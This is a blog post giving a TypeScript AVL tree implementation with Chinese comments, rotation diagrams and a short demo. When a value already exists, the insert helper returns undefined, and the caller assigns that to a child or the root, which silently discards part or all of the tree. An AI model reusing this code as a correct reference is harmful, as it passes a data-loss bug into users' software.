<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * AVL树接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">interface</span> AVLTreeImpl &#123;</span><br><span class="line">    <span class="attr">insert</span>: <span class="function">(<span class="params">value: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">    remove: <span class="function">(<span class="params">target: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">    search: <span class="function">(<span class="params">target: <span class="built_in">number</span></span>) =&gt;</span> TreeNode | <span class="literal">null</span>;</span><br><span class="line">    getRoot: <span class="function">() =&gt;</span> TreeNode;</span><br><span class="line">    getMin: <span class="function">(<span class="params">node: TreeNode</span>) =&gt;</span> TreeNode;</span><br><span class="line">    getMax: <span class="function">(<span class="params">node: TreeNode</span>) =&gt;</span> TreeNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 树节点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> value: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">public</span> left: TreeNode | <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> right: TreeNode | <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">        <span class="built_in">this</span>.left = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.right = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * AVL树</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AVLTree</span> <span class="title">implements</span> <span class="title">AVLTreeImpl</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> root: TreeNode | <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">value: <span class="built_in">number</span></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = <span class="keyword">new</span> TreeNode(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 前序遍历</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PRE_ORDER_TRAVERSE(node: TreeNode): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(node.value);</span><br><span class="line">        <span class="built_in">this</span>.PRE_ORDER_TRAVERSE(node.left);</span><br><span class="line">        <span class="built_in">this</span>.PRE_ORDER_TRAVERSE(node.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 中序遍历</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IN_ORDER_TRAVERSE(node: TreeNode): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">this</span>.IN_ORDER_TRAVERSE(node.left);</span><br><span class="line">        <span class="built_in">console</span>.log(node);</span><br><span class="line">        <span class="built_in">this</span>.IN_ORDER_TRAVERSE(node.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 后序遍历</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> POST_ORDER_TRAVERSE(node: TreeNode): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">this</span>.POST_ORDER_TRAVERSE(node.left);</span><br><span class="line">        <span class="built_in">this</span>.POST_ORDER_TRAVERSE(node.right);</span><br><span class="line">        <span class="built_in">console</span>.log(node.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取节点高度</span></span><br><span class="line"><span class="comment">     * 递归实现</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> treeHeight(node: TreeNode): <span class="built_in">number</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.max(<span class="built_in">this</span>.treeHeight(node.left), <span class="built_in">this</span>.treeHeight(node.right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取节点平衡因子</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> getBalanceFactor(node: TreeNode): <span class="built_in">number</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.treeHeight(node.left) - <span class="built_in">this</span>.treeHeight(node.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  对节点y进行向右旋转操作，返回旋转后新的根节点x</span></span><br><span class="line"><span class="comment">     *        y                              x</span></span><br><span class="line"><span class="comment">     *       / \                           /   \</span></span><br><span class="line"><span class="comment">     *      x   T4     向右旋转 (y)        z     y</span></span><br><span class="line"><span class="comment">     *     / \       - - - - - - - -&gt;    / \   / \</span></span><br><span class="line"><span class="comment">     *    z   T3                       T1  T2 T3 T4</span></span><br><span class="line"><span class="comment">     *   / \</span></span><br><span class="line"><span class="comment">     * T1   T2</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> rightRotate(node: TreeNode): TreeNode &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">const</span> leftNode = node.left;</span><br><span class="line">        node.left = leftNode.right;</span><br><span class="line">        leftNode.right = node;</span><br><span class="line">        <span class="keyword">return</span> leftNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对节点y进行向左旋转操作，返回旋转后新的根节点x</span></span><br><span class="line"><span class="comment">     *    y                             x</span></span><br><span class="line"><span class="comment">     *  /  \                          /   \</span></span><br><span class="line"><span class="comment">     * T1   x      向左旋转 (y)       y     z</span></span><br><span class="line"><span class="comment">     *     / \   - - - - - - - -&gt;   / \   / \</span></span><br><span class="line"><span class="comment">     *   T2  z                     T1 T2 T3 T4</span></span><br><span class="line"><span class="comment">     *      / \</span></span><br><span class="line"><span class="comment">     *     T3 T4</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> leftRotate(node: TreeNode): TreeNode &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">const</span> rightNode = node.right;</span><br><span class="line">        node.right = rightNode.left;</span><br><span class="line">        rightNode.left = node;</span><br><span class="line">        <span class="keyword">return</span> rightNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 平衡节点</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> reBalance(node: TreeNode): TreeNode &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span> node;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.getBalanceFactor(node) &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">this</span>.getBalanceFactor(node.left) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * case1：LL情况，直接右旋</span></span><br><span class="line"><span class="comment">             * 对节点y进行向右旋转操作，返回旋转后新的根节点x</span></span><br><span class="line"><span class="comment">             *        y                              x</span></span><br><span class="line"><span class="comment">             *       / \                           /   \</span></span><br><span class="line"><span class="comment">             *      x   T4     向右旋转 (y)        z     y</span></span><br><span class="line"><span class="comment">             *     / \       - - - - - - - -&gt;    / \   / \</span></span><br><span class="line"><span class="comment">             *    z   T3                       T1  T2 T3 T4</span></span><br><span class="line"><span class="comment">             *   / \</span></span><br><span class="line"><span class="comment">             * T1   T2</span></span><br><span class="line"><span class="comment">             * */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.rightRotate(node);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getBalanceFactor(node) &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">this</span>.getBalanceFactor(node.left) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * case2：LR情况，先对左子树节点进行左旋，再对节点进行右旋</span></span><br><span class="line"><span class="comment">             * 对节点x进行向左旋转操作，再对y节点进行右旋操作</span></span><br><span class="line"><span class="comment">             *        y                              y                             T3</span></span><br><span class="line"><span class="comment">             *       / \                           /  \                           /   \</span></span><br><span class="line"><span class="comment">             *      x   T4     向左旋转 (x)        T3   T4       向右旋转 (y)       x     y</span></span><br><span class="line"><span class="comment">             *     / \       - - - - - - - -&gt;    / \         - - - - - - - -&gt;   / \   / \</span></span><br><span class="line"><span class="comment">             *    z   T3                        x  T2                          z  T1 T2  T4</span></span><br><span class="line"><span class="comment">             *       / \                       / \</span></span><br><span class="line"><span class="comment">             *     T1   T2                    z  T1</span></span><br><span class="line"><span class="comment">             * */</span></span><br><span class="line">            node.left = <span class="built_in">this</span>.leftRotate(node.left);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.rightRotate(node);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getBalanceFactor(node) &lt; -<span class="number">1</span> &amp;&amp; <span class="built_in">this</span>.getBalanceFactor(node.right) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * case3：RL情况，先对右子树节点进行右旋，再对节点进行左旋</span></span><br><span class="line"><span class="comment">             * 对节点T4进行向右旋转操作，再对y节点进行左旋操作</span></span><br><span class="line"><span class="comment">             *        y                                   y                                     z</span></span><br><span class="line"><span class="comment">             *       / \                                /  \                                  /   \</span></span><br><span class="line"><span class="comment">             *      x   T4          向右旋转 (T4)       x    z            向左旋转 (y)          y     T4</span></span><br><span class="line"><span class="comment">             *         / \       - - - - - - - -&gt;         / \         - - - - - - - -&gt;      / \   / \</span></span><br><span class="line"><span class="comment">             *       z   T3                              T1  T4                            x  T1 T2  T3</span></span><br><span class="line"><span class="comment">             *      / \                                     / \</span></span><br><span class="line"><span class="comment">             *    T1   T2                                 T2  T3</span></span><br><span class="line"><span class="comment">             * */</span></span><br><span class="line">            node.right = <span class="built_in">this</span>.rightRotate(node.right);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.leftRotate(node);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getBalanceFactor(node) &lt; -<span class="number">1</span> &amp;&amp; <span class="built_in">this</span>.getBalanceFactor(node.right) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * case4：RR情况，直接左旋</span></span><br><span class="line"><span class="comment">             * 对节点y进行向左旋转操作，返回旋转后新的根节点x</span></span><br><span class="line"><span class="comment">             *    y                             x</span></span><br><span class="line"><span class="comment">             *  /  \                          /   \</span></span><br><span class="line"><span class="comment">             * T1   x      向左旋转 (y)       y     z</span></span><br><span class="line"><span class="comment">             *     / \   - - - - - - - -&gt;   / \   / \</span></span><br><span class="line"><span class="comment">             *   T2  z                     T1 T2 T3 T4</span></span><br><span class="line"><span class="comment">             *      / \</span></span><br><span class="line"><span class="comment">             *     T3 T4</span></span><br><span class="line"><span class="comment">             * */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.leftRotate(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 插入节点</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="title">insert</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = <span class="built_in">this</span>.insertNode(<span class="built_in">this</span>.root, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 插入节点辅助函数，利用递归实现</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">private</span> insertNode(root: TreeNode, <span class="attr">value</span>: <span class="built_in">number</span>): TreeNode &#123;</span><br><span class="line">        <span class="keyword">if</span> (root.value &lt; value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!root.right) &#123;</span><br><span class="line">                root.right = <span class="keyword">new</span> TreeNode(value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 这步递归是关键，非常巧妙，insertNode方法会将沿途的节点重新平衡</span></span><br><span class="line">                <span class="comment">// 平衡后，小范围子树的根节点可能就会发生变化，会失去与父节点的连接关系</span></span><br><span class="line">                <span class="comment">// 而重新将其赋值给root.right父节点之后，又能重新建立联系</span></span><br><span class="line">                root.right = <span class="built_in">this</span>.insertNode(root.right, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root.value &gt; value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!root.left) &#123;</span><br><span class="line">                root.left = <span class="keyword">new</span> TreeNode(value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                root.left = <span class="built_in">this</span>.insertNode(root.left, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 在叶子节点中插入新的节点后，会沿经过路径重新平衡整棵树</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.reBalance(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查找节点</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> search(target: <span class="built_in">number</span>): TreeNode &#123;</span><br><span class="line">        <span class="keyword">let</span> node = <span class="built_in">this</span>.root;</span><br><span class="line">        <span class="keyword">while</span> (node) &#123;</span><br><span class="line">            <span class="keyword">if</span> (target &lt; node.value) &#123;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; node.value) &#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取根节点</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="title">getRoot</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除节点</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="title">remove</span>(<span class="params">value: <span class="built_in">number</span></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = <span class="built_in">this</span>.removeNode(<span class="built_in">this</span>.root, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除节点辅助函数</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">private</span> removeNode(node: TreeNode, <span class="attr">target</span>: <span class="built_in">number</span>): TreeNode &#123;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; node.value &amp;&amp; node.right) &#123;</span><br><span class="line">            node.right = <span class="built_in">this</span>.removeNode(node.right, target);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; node.value &amp;&amp; node.left) &#123;</span><br><span class="line">            node.left = <span class="built_in">this</span>.removeNode(node.left, target);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(target === node.value) &#123;</span><br><span class="line">            <span class="keyword">let</span> curNode = node;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 目标节点是叶子节点，无左右子节点，直接删除</span></span><br><span class="line">            <span class="keyword">if</span> (!curNode.left &amp;&amp; !curNode.right) &#123;</span><br><span class="line">                curNode = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">return</span> curNode;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 目标节点有左节点，无右节点</span></span><br><span class="line">            <span class="keyword">if</span> (curNode.left &amp;&amp; !curNode.right) &#123;</span><br><span class="line">                curNode.value = curNode.left.value;</span><br><span class="line">                curNode.left = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">return</span> curNode;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 目标节点有右节点，无左节点</span></span><br><span class="line">            <span class="keyword">if</span> (!curNode.left &amp;&amp; curNode.right) &#123;</span><br><span class="line">                curNode.value = curNode.right.value;</span><br><span class="line">                curNode.right = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">return</span> curNode;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 目标节点处于中间位置，存在左子节点也存在右子节点</span></span><br><span class="line"><span class="comment">             * 可以有以下两种处理方式：</span></span><br><span class="line"><span class="comment">             * 1、找到当前要删除节点左子树中最大的节点与要删除的节点进行替换</span></span><br><span class="line"><span class="comment">             * 2、找到当前要删除节点右子树中最小的节点与要删除的节点进行替换</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * 以第一种方式为例:</span></span><br><span class="line"><span class="comment">             * 找到左子树中最大的节点s，将s的值替换要删除的节点的值并删除节点s</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (curNode.left &amp;&amp; curNode.right) &#123;</span><br><span class="line">                <span class="keyword">let</span> maxNodeOfLeft = <span class="built_in">this</span>.getMax(curNode.left);</span><br><span class="line">                curNode.value = maxNodeOfLeft.value;</span><br><span class="line">                curNode.left = <span class="built_in">this</span>.removeNode(curNode.left, maxNodeOfLeft.value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.reBalance(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最小节点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> getMin(node: TreeNode): TreeNode &#123;</span><br><span class="line">        <span class="keyword">while</span> (node.left) &#123;</span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最大节点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> getMax(node: TreeNode): TreeNode &#123;</span><br><span class="line">        <span class="keyword">while</span> (node.right) &#123;</span><br><span class="line">            node = node.right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> avl = <span class="keyword">new</span> AVLTree(<span class="number">1</span>);</span><br><span class="line">avl.insert(<span class="number">2</span>);</span><br><span class="line">avl.insert(<span class="number">3</span>);</span><br><span class="line">avl.insert(<span class="number">4</span>);</span><br><span class="line">avl.insert(<span class="number">5</span>);</span><br><span class="line">avl.insert(<span class="number">6</span>);</span><br><span class="line">avl.insert(<span class="number">7</span>);</span><br><span class="line">avl.insert(<span class="number">8</span>);</span><br><span class="line">avl.insert(<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">avl.remove(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">AVLTree.IN_ORDER_TRAVERSE(avl.getRoot());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</p>
      <div class="post-button"><a class="btn" href="/2021/05/10/avlTree/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
    </div>
  </div>
  <div class="lx-entry padding">
    <div>
      <h2 class="title"><a href="/2021/05/09/bst/">二叉搜索树TS实现</a></h2>
      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-05-09</span>
